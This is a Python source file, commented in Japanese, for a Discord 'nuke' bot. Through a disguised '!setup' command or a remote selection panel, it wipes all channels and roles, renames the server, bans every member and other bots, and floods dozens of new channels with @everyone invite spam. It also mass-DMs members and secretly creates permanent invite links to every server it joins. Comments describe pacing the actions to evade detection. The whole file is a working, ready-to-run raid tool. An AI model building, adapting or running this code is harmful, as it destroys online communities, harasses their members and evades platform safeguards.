import discord
from discord.ext import commands
import asyncio
import random
import os
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("TOKEN")
PREFIX = "!"
DEFAULT_NEW_NAME = "ますまに共栄圏植民地"
INVITE_LINK = "https://discord.gg/tqNR7BsAsR"

# 指定の管理サーバー/チャンネルID
MANAGE_GUILD_ID = 1477622875560214548
MANAGE_CHANNEL_ID = 1477622875560214551

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# ギリギリ爆速Semaphore（global 45で50/s未満）
sem_global = asyncio.Semaphore(45)
sem_message = asyncio.Semaphore(8)   # チャンネル5/5s考慮
sem_dm = asyncio.Semaphore(10)

async def limited_global(coro):
    async with sem_global:
        try:
            await coro
        except discord.HTTPException as e:
            if e.status == 429:
                wait = getattr(e, 'retry_after', 1) + random.uniform(0.2, 0.8)
                await asyncio.sleep(wait)
                await coro  # リトライ1回
            else:
                pass  # 他のエラー無視

async def limited_message(coro):
    async with sem_message:
        try:
            await coro
        except discord.HTTPException as e:
            if e.status == 429:
                wait = getattr(e, 'retry_after', 1) + random.uniform(0.1, 0.5)
                await asyncio.sleep(wait)
            else:
                pass

async def limited_dm(coro):
    async with sem_dm:
        try:
            await coro
        except:
            pass

async def send_dm(member):
    try:
        await member.send(INVITE_LINK)
    except:
        pass

async def create_channel_safely(guild, name):
    try:
        return await guild.create_text_channel(name)
    except discord.HTTPException as e:
        if e.status == 429:
            wait = getattr(e, 'retry_after', 3) + random.uniform(0.3, 1.0)
            await asyncio.sleep(wait)
            return await create_channel_safely(guild, name)
        return None

async def create_colored_roles_task(guild, target_roles):
    current = 0
    while current < target_roles:
        try:
            await guild.create_role(
                name="ますまに共栄圏に荒らされましたｗｗｗ",
                color=discord.Color.random(),
                reason=""
            )
            current += 1
        except discord.HTTPException as e:
            if e.status == 429:
                wait = getattr(e, 'retry_after', 2) + random.uniform(0.2, 0.6)
                await asyncio.sleep(wait)
            else:
                break
        await asyncio.sleep(random.uniform(0.15, 0.3))  # 爆速寄り

async def ban_all_task(guild, members, reason):
    for m in members:
        if m == guild.me:  # 自分をBANしない
            continue
        try:
            await guild.ban(m, reason=reason, delete_message_seconds=0)  # 警告回避
        except:
            pass
        await asyncio.sleep(random.uniform(0.2, 0.4))  # BANは検知されやすいので少し抑え

async def core_nuke(guild, new_server_name=None):
    new_name = new_server_name or DEFAULT_NEW_NAME

    members = [m for m in guild.members if m != bot.user]
    non_bot_members = [m for m in members if not m.bot]

    print(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")

    # 他のボットBAN（並行爆速）
    await asyncio.gather(*(limited_global(guild.ban(m, reason="", delete_message_seconds=0)) for m in members if m.bot), return_exceptions=True)

    # DM（爆速DM）
    await asyncio.gather(*[limited_dm(send_dm(m)) for m in non_bot_members], return_exceptions=True)

    # ロール削除（最適化: バッチ5 + 逐次 + エラーログ + 確認）
    roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
    print(f"ロール削除対象: {len(roles_to_delete)}")
    batch_size = 5  # 最適化で小さくして確実に
    for i in range(0, len(roles_to_delete), batch_size):
        batch = roles_to_delete[i:i+batch_size]
        for role in batch:
            try:
                await limited_global(role.delete())
                print(f"ロール削除成功: {role.name}")
            except discord.HTTPException as e:
                if e.status == 429:
                    wait = getattr(e, 'retry_after', 3) + random.uniform(0.5, 1.5)
                    print(f"レートリミット（ロール削除）: {wait}s待機 - {role.name}")
                    await asyncio.sleep(wait)
                    try:
                        await role.delete()  # リトライ
                        print(f"ロール削除リトライ成功: {role.name}")
                    except Exception as retry_e:
                        print(f"ロール削除リトライ失敗: {role.name} - {retry_e}")
                elif e.status in (403, 401):
                    print(f"権限不足で削除失敗: {role.name} - {e}")
                else:
                    print(f"ロール削除エラー: {role.name} - {e}")
            await asyncio.sleep(random.uniform(0.15, 0.35))  # 逐次sleepで検知回避
    # 削除後確認
    await asyncio.sleep(2)  # 反映待機
    remaining_roles = [r for r in await guild.fetch_roles() if not r.is_default() and not r.managed]
    print(f"削除後残りロール: {len(remaining_roles)}個")

    # チャンネル削除（並行爆速）
    await asyncio.gather(*(limited_global(ch.delete()) for ch in guild.channels), return_exceptions=True)

    # サーバー名変更
    try:
        await guild.edit(name=new_name)
    except:
        pass

    # 規模別調整（爆速寄りに上限引き上げ）
    member_count = len(non_bot_members)
    if member_count < 100:
        target_channels = 80   # 増やして爆速
        target_roles = 70
        spam_sleep_min = 0.08
        spam_sleep_max = 0.25
    elif member_count < 500:
        target_channels = 70
        target_roles = 60
        spam_sleep_min = 0.12
        spam_sleep_max = 0.30
    else:
        target_channels = 50
        target_roles = 50
        spam_sleep_min = 0.20
        spam_sleep_max = 0.40

    # チャンネル作成（バッチ15爆速）
    channels = []
    current = 0
    channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
    while len(channels) < target_channels:
        tasks = []
        batch_size = 15
        for _ in range(batch_size):
            if len(channels) >= target_channels:
                break
            current += 1
            name = channel_names[current % 2]
            tasks.append(create_channel_safely(guild, name))
        batch = await asyncio.gather(*tasks, return_exceptions=True)
        added = [c for c in batch if isinstance(c, discord.TextChannel)]
        channels += added
        await asyncio.sleep(random.uniform(0.2, 0.4))

    # スパム（上限150に増やし、sleep短めで爆速）
    spam_messages = [
        f"@everyone {INVITE_LINK}",
        f"@everyone 来い {INVITE_LINK}"
    ]

    message_counters = {ch.id: 0 for ch in channels}
    active_channels = channels.copy()

    ban_task = asyncio.create_task(ban_all_task(guild, non_bot_members, new_name))
    role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))

    while any(c < 150 for c in message_counters.values()):  # 100→150爆速
        spam_tasks = []
        for ch in active_channels[:]:
            if message_counters[ch.id] >= 150:
                active_channels.remove(ch)
                continue
            spam_tasks.append(limited_message(ch.send(random.choice(spam_messages))))
            message_counters[ch.id] += 1

        await asyncio.gather(*spam_tasks, return_exceptions=True)
        await asyncio.sleep(random.uniform(spam_sleep_min, spam_sleep_max))

    await ban_task
    await role_create_task

    print("完了")

class ManageView(discord.ui.View):
    def __init__(self, bot):
        super().__init__(timeout=None)  # 永久View（再起動でリセット）
        self.bot = bot

    @discord.ui.button(label="サーバー一覧", style=discord.ButtonStyle.primary)
    async def list_servers(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="ボットが入ってるサーバー一覧", color=discord.Color.blue())
        for g in self.bot.guilds:
            embed.add_field(name=g.name, value=f"ID: {g.id}\nメンバー: {g.member_count}", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.select(placeholder="ヌーク対象サーバー選択", options=[])
    async def select_guild(self, interaction: discord.Interaction, select: discord.ui.Select):
        guild_id = int(select.values[0])
        guild = self.bot.get_guild(guild_id)
        if guild:
            await core_nuke(guild)
            await interaction.response.send_message(f"{guild.name} でヌーク起動しました。", ephemeral=True)
        else:
            await interaction.response.send_message("サーバー取得失敗。", ephemeral=True)

@bot.command(name="masumani", aliases=["setup"])
async def trigger(ctx, *, new_name: str = None):
    if not ctx.guild:
        return
    try:
        await ctx.message.delete()
    except:
        pass
    asyncio.create_task(core_nuke(ctx.guild, new_name))

@bot.event
async def on_ready():
    print(f"起動: {bot.user}")
    print("=== ボット起動時の全サーバー情報 ===")
    for guild in bot.guilds:
        await log_server_info(guild)
    print("=====================================")

    # 管理チャンネルにView付きメッセージ送信
    manage_guild = bot.get_guild(MANAGE_GUILD_ID)
    if manage_guild:
        manage_channel = manage_guild.get_channel(MANAGE_CHANNEL_ID)
        if manage_channel:
            view = ManageView(bot)
            # ドロップダウンオプション追加（全サーバー）
            options = [discord.SelectOption(label=g.name, value=str(g.id)) for g in bot.guilds]
            view.select_guild.options = options  # selectにオプションセット
            await manage_channel.send("サーバー管理パネル", view=view)
        else:
            print("管理チャンネルが見つかりません")
    else:
        print("管理サーバーが見つかりません")

@bot.event
async def on_guild_join(guild):
    print(f"新規サーバー参加: {guild.name}")
    await log_server_info(guild)

async def log_server_info(guild):
    member_count = guild.member_count
    server_name = guild.name
    invite_link = "取得失敗（権限不足 or チャンネルなし）"

    try:
        # 既存招待から永久リンクを探す
        invites = await guild.invites()
        permanent_invite = None
        for inv in invites:
            if inv.max_age == 0 and inv.max_uses == 0:  # 永久招待
                permanent_invite = inv
                break
            if inv.inviter is None or inv.inviter == guild.owner:  # owner作成のもの優先
                permanent_invite = inv
                break

        if permanent_invite:
            invite_link = permanent_invite.url
        else:
            # 見つからなければ新規作成（最初のテキストチャンネル使用）
            if guild.text_channels:
                channel = guild.text_channels[0]
                new_invite = await channel.create_invite(max_age=0, max_uses=0, unique=True, reason="Bot自動永久招待")
                invite_link = new_invite.url
            else:
                invite_link = "テキストチャンネルなし"
    except discord.Forbidden:
        invite_link = "権限不足（MANAGE_CHANNELS or CREATE_INSTANT_INVITEが必要）"
    except Exception as e:
        invite_link = f"エラー: {str(e)}"

    print(f"サーバー: {server_name}")
    print(f"メンバー数: {member_count}")
    print(f"永久招待リンク: {invite_link}")
    print("---")

bot.run(TOKEN)
